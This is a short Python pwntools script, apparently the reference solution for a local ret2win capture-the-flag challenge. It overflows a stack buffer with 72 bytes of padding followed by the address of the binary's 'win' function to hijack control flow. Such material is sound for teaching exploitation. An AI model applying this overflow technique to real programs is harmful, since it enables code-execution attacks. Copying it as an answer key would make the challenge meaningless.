#!/usr/bin/env python3
"""Reference solve for the bundled local ret2win challenge."""

import os

from pwn import ELF, context, p64, process


context.log_level = "error"
challenge = os.environ["TARGET"]
elf = ELF(challenge, checksec=False)

padding = b"A" * 72
payload = padding + p64(elf.symbols["win"])

io = process(challenge)
io.sendline(payload)
print(io.recvall(timeout=5).decode("utf-8", errors="replace"))

